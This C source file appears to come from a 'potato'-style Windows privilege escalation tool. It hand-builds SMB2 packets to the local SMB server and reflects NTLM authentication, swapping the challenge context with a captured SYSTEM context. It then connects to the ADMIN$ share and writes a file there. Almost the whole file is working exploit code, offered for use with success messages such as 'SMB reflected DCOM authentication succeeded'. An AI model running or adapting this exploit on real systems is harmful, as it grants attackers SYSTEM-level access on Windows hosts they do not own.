#define SECURITY_WIN32 
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996)

#include "windows.h"
#include "stdio.h"
#include "winsock.h"
#include "sspi.h"
#include "SMBClient.h"

// global vars
extern HANDLE event1;
extern HANDLE event2;
extern HANDLE event3;
extern char SystemContext[];
extern char UserContext[];

BOOL DoAuthenticatedFileWriteSMB(SOCKET s);
SOCKET ConnectSocket(const wchar_t* ipAddress, int port);
BOOL GenClientContext(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText);
int findNTLMBytes(char* bytes, int len);

void SMBAuthenticatedFileWrite()
{
    SOCKET smbSocket = ConnectSocket(L"127.0.0.1", 445);
    DoAuthenticatedFileWriteSMB(smbSocket);
    closesocket(smbSocket);
}

BOOL DoAuthenticatedFileWriteSMB(SOCKET s)
{
    BOOL fDone = FALSE;
    DWORD cbOut = 0;
    DWORD cbIn = 0;
    PBYTE pInBuf;
    PBYTE pOutBuf;
    myint mpid;
    myshort slen;
    CredHandle hCred;
    struct _SecHandle  hcText;

    unsigned char smb_nego_protocol[] = \
        "\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x01\x48" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xac\x7b" \
        "\x00\x00\x00\x00\x00\x22\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e" \
        "\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00\x02\x53" \
        "\x4d\x42\x20\x32\x2e\x3f\x3f\x3f\x00";

    unsigned char smb2_nego_protocol[] = \
        "\x00\x00\x00\x68\xfe\x53\x4d\x42\x40\x00\x01\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00" \
        "\x00\x00\x00\x00\x30\x7e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x24\x00\x02\x00\x01\x00\x00\x00\x01\x00\x00\x00" \
        "\xb3\x2a\x22\x3f\xcf\x5f\x43\x9c\xbb\x55\x8c\x98\x11\xd2\x5f\x1c" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x02\x02\x10\x02\x00";

    unsigned char tree_connect_admin[] = \
        "\x09\x00\x00\x00\x48\x00\x24\x00\x5c\x00\x5c\x00" \
        "\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00\x2e\x00" \
        "\x30\x00\x2e\x00\x31\x00\x5c\x00\x61\x00" \
        "\x64\x00\x6d\x00\x69\x00\x6e\x00\x24";

    usmb2_header s2h;
    usmb2_data s2d;
    char recBuffer[DEFAULT_BUFLEN];

    pInBuf = (PBYTE)malloc(DEFAULT_BUFLEN);
    pOutBuf = (PBYTE)malloc(DEFAULT_BUFLEN);

    int pid = GetCurrentProcessId();

    mpid.i = pid;
    myshort ms, datalen;
    ms.i = pid;

    memcpy(&smb_nego_protocol[30], ms.buffer, 2);
    memcpy(&smb2_nego_protocol[36], mpid.buffer, 4);

    cbOut = DEFAULT_BUFLEN;

    if (!GenClientContext(NULL, 0, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, &hCred, &hcText))
    {
        return(FALSE);
    }

    char InBuffer[1024], OutBuffer[1024];
    int len = 0, plen = 0;
    unsigned char sessid[8];

    memcpy(slen.buffer, &smb_nego_protocol[2], 2);

    char c = smb_nego_protocol[3];
    len = send(s, (char*)smb_nego_protocol, c + 4, 0);

    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);

    c = smb2_nego_protocol[3];
    len = send(s, (char*)smb2_nego_protocol, c + 4, 0);

    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);

    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x01\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.MessageID[0], "\x02\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);

    datalen.i = cbOut;
    memcpy(&s2d.smb2_data.StructureSize, "\x19\x00", 2);
    memcpy(&s2d.smb2_data.Flags, "\x00", 1);
    memcpy(&s2d.smb2_data.SecurityMode, "\x01", 1);
    memcpy(&s2d.smb2_data.Capabilities, "\x07\x00\x00\x00", 4);
    memcpy(&s2d.smb2_data.Channel, "\x00\x00\x00\x00", 4);
    memcpy(&s2d.smb2_data.SecurityBufferOffset, "\x58\x00", 2);
    memcpy(&s2d.smb2_data.SecurityBufferLength, datalen.buffer, 2);
    memcpy(&s2d.smb2_data.PreviousSessionID, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);

    plen = sizeof(s2h.buffer) + sizeof(s2d.buffer) + cbOut;
    datalen.i = plen;
    int start = 2;
    slen.i = plen;
    c = plen;

    memset(OutBuffer, 0, sizeof(OutBuffer));

    start = 0;
    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
    start += sizeof(s2h.buffer);
    memcpy(&OutBuffer[start], s2d.buffer, sizeof(s2d.buffer));

    start += sizeof(s2d.buffer);
    memcpy(&OutBuffer[start], pOutBuf, cbOut);
    start = sizeof(s2h) + sizeof(s2d) + cbOut;
    char netsess[4];
    memset(netsess, 0, 4);
    netsess[3] = slen.buffer[0];
    netsess[2] = slen.buffer[1];
    len = send(s, (char*)netsess, 4, 0);
    len = send(s, (char*)OutBuffer, start, 0);

    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);

    int pos = findNTLMBytes(recBuffer, len);
    memcpy(&InBuffer[0], &recBuffer[pos], len - pos);
    if (InBuffer[8] == 2)
    {
        memcpy(UserContext, &InBuffer[32], 8);
        WaitForSingleObject(event1, INFINITE);
        // for local auth reflection we don't really need to relay the entire packet 
        // swapping the context in the Reserved bytes with the SYSTEM context is enough
        memcpy(&InBuffer[32], SystemContext, 8);
        memcpy(&recBuffer[pos], &InBuffer[0], len - pos);
        printf("[+] SMB Client Auth Context swapped with SYSTEM \n");
    }
    else {
        printf("[!] Authentication over SMB is not using NTLM. Exiting...\n");
        return FALSE;
    }
    cbOut = DEFAULT_BUFLEN;
    memcpy(&sessid[0], &recBuffer[44], 8);
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x01\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x10\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.MessageID[0], "\x03\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    if (!GenClientContext((BYTE*)InBuffer, len - pos, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, &hCred, &hcText))
        exit(-1);
    
    datalen.i = cbOut;

    SetEvent(event2);
    WaitForSingleObject(event3, INFINITE);

    memcpy(&s2d.smb2_data.StructureSize, "\x19\00", 2);
    memcpy(&s2d.smb2_data.Flags, "\00", 1);
    memcpy(&s2d.smb2_data.SecurityMode, "\x01", 1);
    memcpy(&s2d.smb2_data.Capabilities, "\x07\x00\x00\x00", 4);
    memcpy(&s2d.smb2_data.Channel, "\x00\x00\x00\x00", 4);
    memcpy(&s2d.smb2_data.SecurityBufferOffset, "\x58\x00", 2);
    memcpy(&s2d.smb2_data.SecurityBufferLength, datalen.buffer, 2);
    memcpy(&s2d.smb2_data.PreviousSessionID, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
    plen = sizeof(s2h.buffer) + sizeof(s2d.buffer) + cbOut;
    slen.i = plen;
    c = plen;
    memcpy(&OutBuffer[0], slen.buffer, 4);
    start = 0;
    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
    start += sizeof(s2h.buffer);
    memcpy(&OutBuffer[start], s2d.buffer, sizeof(s2d.buffer));
    start += sizeof(s2d.buffer);
    memcpy(&OutBuffer[start], pOutBuf, cbOut);
    start += cbOut;

    memset(netsess, 0, 4);
    netsess[3] = slen.buffer[0];
    netsess[2] = slen.buffer[1];
    len = send(s, (char*)netsess, 4, 0);
    len = send(s, (char*)OutBuffer, start, 0);

    // here we receive the return status of the SMB authentication
    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    unsigned int* ntlmAuthStatus = (unsigned int*)(recBuffer + 12);
    if (*ntlmAuthStatus != 0) {
        printf("[!] SMB reflected DCOM authentication failed with status code 0x%x\n", *ntlmAuthStatus);
        return FALSE;
    }
    else {
        printf("[+] SMB reflected DCOM authentication succeeded!\n");
    }


    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x03\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.MessageID[0], "\x04\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    memset(netsess, 0, 4);
    netsess[3] = sizeof(s2h.buffer) + sizeof(tree_connect_admin);//length cablata si calcola facilmeente vedi sopra

    len = send(s, netsess, 4, 0);
    len = send(s, (char*)s2h.buffer, sizeof(s2h.buffer), 0);
    len = send(s, (char*)tree_connect_admin, sizeof(tree_connect_admin), 0);
    
    
    // here we receive the return status of the Connect Tree from SMB
    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    unsigned int* connectTreeStatus = (unsigned int*)(recBuffer + 12);
    if (*connectTreeStatus != 0) {
        printf("[!] SMB Connect Tree failed with status code 0x%x\n", *connectTreeStatus);
        return FALSE;
    }
    else {
        printf("[+] SMB Connect Tree success!\n");
    }

    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x05\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.MessageID[0], "\x06\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);

    unsigned char create_file[] = \
        "\x39\x00\x00\xff\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x96\x01\x12\x00\x80\x00\x00\x00" \
        "\x01\x00\x00\x00\x05\x00\x00\x00\x60\x00\x00\x00\x78\x00\x18\x00" \
        "\x90\x00\x00\x00\xb4\x00\x00\x00\x70\x00\x6f\x00\x74\x00\x61\x00" \
        "\x74\x00\x6f\x00\x2e\x00\x6c\x00\x6f\x00\x63\x00\x61\x00\x6c\x00" \
        "\x38\x00\x00\x00\x10\x00\x04\x00\x00\x00\x18\x00\x20\x00\x00\x00" \
        "\x44\x48\x32\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\xc7\x03\x2b\xf3\x9a\x2a\xed\x11" \
        "\x9b\xb5\x54\xbe\x34\x9b\x49\x02\x18\x00\x00\x00\x10\x00\x04\x00" \
        "\x00\x00\x18\x00\x00\x00\x00\x00\x4d\x78\x41\x63\x00\x00\x00\x00" \
        "\x18\x00\x00\x00\x10\x00\x04\x00\x00\x00\x18\x00\x00\x00\x00\x00" \
        "\x51\x46\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x04\x00" \
        "\x00\x00\x18\x00\x34\x00\x00\x00\x52\x71\x4c\x73\x00\x00\x00\x00" \
        "\x1a\x7e\x33\xfa\xe5\x99\x6b\xe2\x26\xdc\x50\xcd\x83\x2e\x1c\x04" \
        "\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x3f\x5b\x29\x5c\x98\x85\x50\x7e\x99\x16\xb0\x10\x6e\x8f\x13\xc2" \
        "\x00\x00\x00";

    memset(netsess, 0, 4);
    netsess[2] = 0x01;//length cablata si calcola facilmeente vedi sopra
    netsess[3] = 0x44;//length cablata si calcola facilmeente vedi sopra
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x05\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.MessageID[0], "\x06\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    memcpy(InBuffer, netsess, 4);
    memcpy(&InBuffer[4], s2h.buffer, sizeof(s2h.buffer));

    len = send(s, (char*)InBuffer, sizeof(s2h.buffer) + 4, 0);
    len = send(s, (char*)create_file, sizeof(create_file), 0);
    
    // here we receive the return status of the Create Request File from SMB
    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    unsigned int* createFileStatus = (unsigned int*)(recBuffer + 12);
    if (*createFileStatus != 0) {
        printf("[!] SMB Create Request File failed with status code 0x%x\n", *createFileStatus);
        return FALSE;
    }
    else {
        printf("[+] SMB Create Request File success!\n");
    }

    char fileid[16];
    memcpy(fileid, recBuffer + 132, 16);
    unsigned char write_data[] = \
        "\x31\x00\x70\x00\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x12\x00\x00\x00\x0a\x00\x00\x00\x05\x00\x00\x00\x0a\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x57\x65\x20\x6c\x6f\x76\x65\x20\x70\x6f\x74\x61\x74\x6f\x65\x73" \
        "\x21\x20\x20\x0d\x0a"
        ;

    memcpy(write_data + 16, fileid, 16);
    memset(netsess, 0, 4);

    netsess[3] = 0x85; //length cablata si calcola facilmeente vedi sopra
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x09\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.MessageID[0], "\x08\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    memcpy(InBuffer, netsess, 4);
    memcpy(&InBuffer[4], s2h.buffer, sizeof(s2h.buffer));

    len = send(s, (char*)InBuffer, sizeof(s2h.buffer) + 4, 0);
    len = send(s, (char*)write_data, sizeof(write_data), 0);

    // here we receive the return status of the Write Response from SMB
    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    unsigned int* writeResponseStatus = (unsigned int*)(recBuffer + 12);
    if (*writeResponseStatus != 0) {
        printf("[!] SMB Write Request failed with status code 0x%x\n", *writeResponseStatus);
        return FALSE;
    }
    else {
        printf("[+] SMB Write Request success!\n");
    }

    unsigned char close_file[] = \
        "\x18\x00\x01\x00\x00\x00\x00\x00\x10\x00\x00\x00\x0a\x00\x00\x00" \
        "\x09\x00\x00\x00\x0a\x00\x00\x00";
    memset(netsess, 0, 4);
    netsess[3] = 0x58; //length cablata si calcola facilmeente vedi sopra
    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
    memcpy(&s2h.smb2_header.Command[0], "\x06\x00", 2);
    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
    memcpy(&s2h.smb2_header.Flags[0], "\x30\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.MessageID[0], "\x09\x00\x00\x00\x00\x00\x00\x00", 8);
    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
    memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
    memcpy(InBuffer, netsess + 1, 3);
    memcpy(&InBuffer[3], s2h.buffer, sizeof(s2h.buffer));
    memcpy(close_file + 8, fileid, 16);
    len = send(s, (char*)InBuffer, sizeof(s2h.buffer) + 3, 0);
    len = send(s, (char*)close_file, sizeof(close_file), 0);

    free(pInBuf);
    free(pOutBuf);
    return(TRUE);
}

BOOL GenClientContext(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText)
{
    SECURITY_STATUS   ss;
    TimeStamp         Lifetime;
    SecBufferDesc     OutBuffDesc;
    SecBuffer         OutSecBuff;
    SecBufferDesc     InBuffDesc;
    SecBuffer         InSecBuff;
    ULONG             ContextAttributes;
    static PTCHAR     lpPackageName = (PTCHAR)L"NTLM";

    if (NULL == pIn)
    {
        ss = AcquireCredentialsHandleW(NULL, lpPackageName, SECPKG_CRED_OUTBOUND, (PVOID)0, NULL, NULL, NULL, hCred, &Lifetime);
        if (!(SEC_SUCCESS(ss))) {
            printf("[!] AcquireCredentialsHandleW failed with error code 0x%x\n", ss);
            return FALSE;
        }
    }
    OutBuffDesc.ulVersion = 0;
    OutBuffDesc.cBuffers = 1;
    OutBuffDesc.pBuffers = &OutSecBuff;
    OutSecBuff.cbBuffer = *pcbOut;
    OutSecBuff.BufferType = SECBUFFER_TOKEN;
    OutSecBuff.pvBuffer = pOut;
    if (pIn)
    {
        InBuffDesc.ulVersion = 0;
        InBuffDesc.cBuffers = 1;
        InBuffDesc.pBuffers = &InSecBuff;
        InSecBuff.cbBuffer = cbIn;
        InSecBuff.BufferType = SECBUFFER_TOKEN;
        InSecBuff.pvBuffer = pIn;
        ss = InitializeSecurityContextW(hCred, hcText, pszTarget, MessageAttribute, 0, SECURITY_NATIVE_DREP,  &InBuffDesc, 0, hcText, &OutBuffDesc, &ContextAttributes, &Lifetime);
    }
    else
        ss = InitializeSecurityContext(hCred, NULL, (SEC_WCHAR*)pszTarget, MessageAttribute, 0, SECURITY_NATIVE_DREP, NULL, 0, hcText, &OutBuffDesc, &ContextAttributes, &Lifetime);
    if (!SEC_SUCCESS(ss))
    {
        printf("[!] InitializeSecurityContext failed with error code 0x%x\n", ss);
        return FALSE;
    }
    if ((SEC_I_COMPLETE_NEEDED == ss) || (SEC_I_COMPLETE_AND_CONTINUE == ss))
    {
        ss = CompleteAuthToken(hcText, &OutBuffDesc);
        if (!SEC_SUCCESS(ss))
        {
            printf("[!] CompleteAuthToken failed with error code 0x%x\n", ss);
            return FALSE;
        }

    }
    *pcbOut = OutSecBuff.cbBuffer;
    *pfDone = !((SEC_I_CONTINUE_NEEDED == ss) || (SEC_I_COMPLETE_AND_CONTINUE == ss));
    return TRUE;
}

SOCKET ConnectSocket(const wchar_t* ipAddress, int port) {
    char ipAddress_a[20];
    char remotePort_a[12];
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup function failed with error: %d\n", iResult);
        return 1;
    }
    SOCKET ConnectSocket;
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    memset(remotePort_a, 0, 12);
    memset(ipAddress_a, 0, 20);
    wcstombs(ipAddress_a, ipAddress, 20);
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(ipAddress_a);
    clientService.sin_port = htons(port); 
    iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        wprintf(L"[!] ConnectSocket: connect function failed with error: %ld\n", WSAGetLastError());
        iResult = closesocket(ConnectSocket);
        if (iResult == SOCKET_ERROR)
            wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    Sleep(1000);
    printf("[*] Connected to the SMB server with ip %s and port %d\n", ipAddress_a, port);
    return ConnectSocket;
}

int findNTLMBytes(char* bytes, int len)
{
    //Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
    //The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
    //we can just return the index
    char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
    int pIdx = 0;
    int i;
    for (i = 0; i < len; i++) {
        if (bytes[i] == pattern[pIdx]) {
            pIdx = pIdx + 1;
            if (pIdx == 7) return (i - 6);
        }
        else {
            pIdx = 0;
        }
    }
    return -1;
}